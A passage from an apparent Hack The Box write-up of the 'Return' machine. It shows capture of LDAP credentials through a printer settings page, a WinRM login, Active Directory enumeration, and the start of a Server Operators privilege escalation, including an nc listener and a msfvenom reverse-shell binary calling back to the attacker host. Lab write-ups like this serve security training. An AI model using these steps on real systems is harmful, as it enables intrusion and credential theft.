+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.11.108/settings.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ip=10.10.14.9<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.9] from (UNKNOWN) [10.10.11.108] 56961
+</span><span class="z-text z-plain">0*`%return\svc-printer�
+</span><span class="z-text z-plain">                       1edFg43012!!
+</span></code></pre>
+<p>We did receive a connection!</p>
+<p>However, it's a bit gibberish and the credentials aren't clear. Therefore, I'll
+start a capture of all the incoming traffic on my <code>tun0</code> interface:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tcpdump<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>tun0<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/traffic.pcap<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll resend the POST request to coerce the target machine to connect to my
+own.</p>
+<p>If we open the PCAP file, we find an LDAP bind request corresponding to the IP
+and the port used for the authentication.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/return/wireshark-ldap-bind-request.png" alt="Wireshark LDAP bind request" /></p>
+<p>Therefore, the credentials are <code>svc-printer</code>:<code>1edFg43012!!</code>!</p>
+<h2 id="foothold-winrm">Foothold (WinRM)</h2>
+<p>Let's try these credentials to connect to Return over WinRM.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> evil-winrm<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.108<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>svc-printer<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>1edFg43012!!<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt;
+</span></code></pre>
+<p>It worked. Nice!</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>svc-printer</code> (obviously).</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Return's architecture?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>PROCESSOR_ARCHITECTURE<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">AMD64
+</span></code></pre>
+<p>It's using AMD64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="version">Version</h3>
+<p>Let's gather some information about the Windows version of Return.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-ItemProperty</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Path <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-List</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Property <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>ProductName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>CurrentBuildNumber<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ProductName        : Windows Server 2019 Standard
+</span><span class="z-text z-plain">CurrentBuildNumber : 17763
+</span></code></pre>
+<p>In fact, it's Windows Server 2019 Standard build <code>17763</code>.</p>
+<h3 id="hotfixes">Hotfixes</h3>
+<p>Let's retrieve the list of installed hotfixes.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-HotFix</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ExpandProperty <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>HotFixID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Access denied
+</span></code></pre>
+<p>We encounter an error.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Users<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">MemberName          SID
+</span><span class="z-text z-plain">----------          ---
+</span><span class="z-text z-plain">RETURN\Domain Users S-1-5-21-3750359090-2939318659-876128439-513
+</span></code></pre>
+<p>There's only the domain users.</p>
+<p>What about the administrators?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Administrators<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>MemberName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>SID<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">MemberName               SID
+</span><span class="z-text z-plain">----------               ---
+</span><span class="z-text z-plain">RETURN\Administrator     S-1-5-21-3750359090-2939318659-876128439-500
+</span><span class="z-text z-plain">RETURN\Enterprise Admins S-1-5-21-3750359090-2939318659-876128439-519
+</span><span class="z-text z-plain">RETURN\Domain Admins     S-1-5-21-3750359090-2939318659-876128439-512
+</span></code></pre>
+<p>Again, we only find the built-in <code>Administrator</code> and the domain
+<code>Enterprise Admins</code> and <code>Domain Admins</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups, once again using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroup</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>GroupName<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span><span class="z-keyword z-operator z-other z-powershell">,</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>Comment<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>AutoSize
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName                               Comment
+</span><span class="z-text z-plain">---------                               -------
+</span><span class="z-text z-plain">Server Operators                        Members can administer domain servers
+</span><span class="z-text z-plain">Account Operators                       Members can administer domain user and group accounts
+</span><span class="z-text z-plain">Pre-Windows 2000 Compatible Access      A backward compatibility group which allows read access on all users and groups in the domain
+</span><span class="z-text z-plain">Incoming Forest Trust Builders          Members of this group can create incoming, one-way trusts to this forest
+</span><span class="z-text z-plain">Windows Authorization Access Group      Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
+</span><span class="z-text z-plain">Terminal Server License Servers         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
+</span><span class="z-text z-plain">Administrators                          Administrators have complete and unrestricted access to the computer/domain
+</span><span class="z-text z-plain">Users                                   Users are prevented from making accidental or intentional system-wide changes and can run most applications
+</span><span class="z-text z-plain">Guests                                  Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+</span><span class="z-text z-plain">Print Operators                         Members can administer printers installed on domain controllers
+</span><span class="z-text z-plain">Backup Operators                        Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+</span><span class="z-text z-plain">Replicator                              Supports file replication in a domain
+</span><span class="z-text z-plain">Remote Desktop Users                    Members in this group are granted the right to logon remotely
+</span><span class="z-text z-plain">Network Configuration Operators         Members in this group can have some administrative privileges to manage configuration of networking features
+</span><span class="z-text z-plain">Performance Monitor Users               Members of this group can access performance counter data locally and remotely
+</span><span class="z-text z-plain">Performance Log Users                   Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+</span><span class="z-text z-plain">Distributed COM Users                   Members are allowed to launch, activate and use Distributed COM objects on this machine.
+</span><span class="z-text z-plain">IIS_IUSRS                               Built-in group used by Internet Information Services.
+</span><span class="z-text z-plain">Cryptographic Operators                 Members are authorized to perform cryptographic operations.
+</span><span class="z-text z-plain">Event Log Readers                       Members of this group can read event logs from local machine
+</span><span class="z-text z-plain">Certificate Service DCOM Access         Members of this group are allowed to connect to Certification Authorities in the enterprise
+</span><span class="z-text z-plain">RDS Remote Access Servers               Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. Thi...
+</span><span class="z-text z-plain">RDS Endpoint Servers                    Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Se...
+</span><span class="z-text z-plain">RDS Management Servers                  Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The serv...
+</span><span class="z-text z-plain">Hyper-V Administrators                  Members of this group have complete and unrestricted access to all features of Hyper-V.
+</span><span class="z-text z-plain">Access Control Assistance Operators     Members of this group can remotely query authorization attributes and permissions for resources on this computer.
+</span><span class="z-text z-plain">Remote Management Users                 Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span><span class="z-text z-plain">Storage Replica Administrators          Members of this group have complete and unrestricted access to all features of Storage Replica.
+</span><span class="z-text z-plain">Cert Publishers                         Members of this group are permitted to publish certificates to the directory
+</span><span class="z-text z-plain">RAS and IAS Servers                     Servers in this group can access remote access properties of users
+</span><span class="z-text z-plain">Allowed RODC Password Replication Group Members in this group can have their passwords replicated to all read-only domain controllers in the domain
+</span><span class="z-text z-plain">Denied RODC Password Replication Group  Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
+</span><span class="z-text z-plain">DnsAdmins                               DNS Administrators Group
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> ipconfig <span class="z-keyword z-operator z-assignment z-powershell">/</span>all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : printer
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : return.local
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Hybrid
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   DNS Suffix Search List. . . . . . : return.local
+</span><span class="z-text z-plain">                                       htb
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Ethernet0:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : htb
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-C6-13
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   Autoconfiguration Enabled . . . . : Yes
+</span><span class="z-text z-plain">   IPv6 Address. . . . . . . . . . . : dead:beef::23c(Preferred)
+</span><span class="z-text z-plain">   Lease Obtained. . . . . . . . . . : Sunday, February 4, 2024 7:31:00 AM
+</span><span class="z-text z-plain">   Lease Expires . . . . . . . . . . : Sunday, February 4, 2024 9:01:00 AM
+</span><span class="z-text z-plain">   IPv6 Address. . . . . . . . . . . : dead:beef::d8f7:4c35:fd7b:2735(Preferred)
+</span><span class="z-text z-plain">   Link-local IPv6 Address . . . . . : fe80::d8f7:4c35:fd7b:2735%10(Preferred)
+</span><span class="z-text z-plain">   IPv4 Address. . . . . . . . . . . : 10.10.11.108(Preferred)
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:1014%10
+</span><span class="z-text z-plain">                                       10.10.10.2
+</span><span class="z-text z-plain">   DHCPv6 IAID . . . . . . . . . . . : 100683862
+</span><span class="z-text z-plain">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-51-65-D5-00-50-56-B9-C6-13
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : ::1
+</span><span class="z-text z-plain">                                       1.1.1.1
+</span><span class="z-text z-plain">   NetBIOS over Tcpip. . . . . . . . : Enabled
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix Search List :
+</span><span class="z-text z-plain">                                       htb
+</span></code></pre>
+<p>There's only an Ethernet interface.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our Desktop folder, we find the user flag.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-Content</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>C:\Users\svc-printer\Desktop\user.txt<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ac5e92abe7868730f14987c2fde8eda7
+</span></code></pre>
+<h3 id="access-tokens">Access tokens</h3>
+<p>Let's retrieve the groups associated with our current access token.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> whoami <span class="z-keyword z-operator z-assignment z-powershell">/</span>groups
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GROUP INFORMATION
+</span><span class="z-text z-plain">-----------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Group Name                                 Type             SID          Attributes
+</span><span class="z-text z-plain">========================================== ================ ============ ==================================================
+</span><span class="z-text z-plain">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span></code></pre>
+<p>The 'Server Operators' domain group is particularly interesting.</p>
+<blockquote>
+<p>Members of the Server Operators group can take the following actions: sign in
+to a server interactively, create and delete network shared resources, start
+and stop services, back up and restore files, format the hard disk drive of
+the computer, and shut down the computer.</p>
+<p>— <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">Microsoft</a></p>
+</blockquote>
+<h2 id="privilege-escalation-privileged-security-group">Privilege escalation (Privileged security group)</h2>
+<p>Members of Active Directory's 'Server Operators' security group can modify,
+start and stop any services, including privileged ones. This allows an attacker
+to get RCE with the service's privileges.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll use <code>msfvenom</code> to create a reverse shell binary.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>windows/x64/powershell_reverse_tcp<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> LHOST=<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.14.9<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> LPORT=<span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>exe<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/server/revshell.exe<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>I'll transfer it to Return.</p>
+<p>We also need to identify a target service.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell"><span class="z-keyword z-operator z-assignment z-powershell">*</span>Evil<span class="z-keyword z-operator z-assignment z-powershell">-</span>WinRM<span class="z-keyword z-operator z-assignment z-powershell">*</span> PS C:\Users\svc<span class="z-keyword z-operator z-assignment z-powershell">-</span>printer\Documents<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> services
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Path                                                                                                                 Privileges Service
+</span><span class="z-text z-plain">----                                                                                                                 ---------- -------
+</span><span class="z-text z-plain">C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS
+</span><span class="z-text z-plain">\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796
+</span><span class="z-text z-plain">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
